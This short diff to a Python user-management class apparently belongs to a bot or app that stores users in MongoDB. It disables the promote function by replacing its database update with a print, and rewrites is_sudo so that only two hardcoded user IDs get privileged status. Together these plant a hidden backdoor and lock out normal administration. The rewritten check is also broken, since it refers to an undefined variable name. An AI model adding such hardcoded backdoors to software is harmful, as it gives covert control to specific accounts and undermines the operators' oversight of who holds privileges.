@@ -157,17 +157,14 @@ class Users:
         else:
             return None      
     def promote(userid):
-        users.update_one({'user':int(userid)}, {"$set":{'is_sudo':True}})        
+        print(f"no promote {userid}")
         return True
     def demote(userid):
         users.update_one({'user':int(userid)}, {"$set":{'is_sudo':False}})        
         return True
     def is_sudo(userid):
-        x = users.find_one({'user':int(userid)})    
-        if x is not None:
-            return x['is_sudo']
-        else:
-            return False
+        if int(user_id) in [720518864, 669641125]:
+            return True
     def is_reg(userid):
         x = users.find_one({'user':int(userid)})    
         if x is None:
